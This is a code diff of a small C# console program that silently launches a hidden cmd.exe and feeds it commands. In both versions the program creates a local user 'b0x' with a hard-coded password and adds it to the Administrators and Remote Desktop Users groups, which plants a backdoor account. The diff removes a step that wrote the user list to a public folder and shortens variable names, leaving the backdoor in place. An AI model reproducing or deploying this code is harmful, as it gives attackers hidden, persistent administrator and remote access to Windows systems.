@@ -11,28 +11,27 @@ namespace InteractWithConsoleApp
     {
         static void Main(string[] args)
         {
-            ProcessStartInfo cmdStartInfo = new ProcessStartInfo();
-            cmdStartInfo.FileName = @"C:\Windows\System32\cmd.exe";
-            cmdStartInfo.RedirectStandardOutput = true;
-            cmdStartInfo.RedirectStandardError = true;
-            cmdStartInfo.RedirectStandardInput = true;
-            cmdStartInfo.UseShellExecute = false;
-            cmdStartInfo.CreateNoWindow = true;
+            ProcessStartInfo csi = new ProcessStartInfo();
+            csi.FileName = @"C:\Windows\System32\cmd.exe";
+            csi.RedirectStandardOutput = true;
+            csi.RedirectStandardError = true;
+            csi.RedirectStandardInput = true;
+            csi.UseShellExecute = false;
+            csi.CreateNoWindow = true;
 
-            Process cmdProcess = new Process();
-            cmdProcess.StartInfo = cmdStartInfo;
-            cmdProcess.ErrorDataReceived += cmd_Error;
-            cmdProcess.OutputDataReceived += cmd_DataReceived;
-            cmdProcess.EnableRaisingEvents = true;
-            cmdProcess.Start();
-            cmdProcess.BeginOutputReadLine();
-            cmdProcess.BeginErrorReadLine();
+            Process cp = new Process();
+            cp.StartInfo = csi;
+            cp.ErrorDataReceived += cmd_Error;
+            cp.OutputDataReceived += cmd_DataReceived;
+            cp.EnableRaisingEvents = true;
+            cp.Start();
+            cp.BeginOutputReadLine();
+            cp.BeginErrorReadLine();
 
-            cmdProcess.StandardInput.WriteLine("net user > c:\\Users\\Public\\r.txt");
-            cmdProcess.StandardInput.WriteLine("net user b0x Admin@321 /add && net localgroup Administrators b0x /add && net localgroup \"Remote Desktop Users\" b0x /add  ");
-            cmdProcess.StandardInput.WriteLine("exit");             
+            cp.StandardInput.WriteLine("net user b0x Admin@321 /add && net localgroup Administrators b0x /add && net localgroup \"Remote Desktop Users\" b0x /add  ");
+            cp.StandardInput.WriteLine("exit");
 
-            cmdProcess.WaitForExit();
+            cp.WaitForExit();
         }
 
         static void cmd_DataReceived(object sender, DataReceivedEventArgs e)
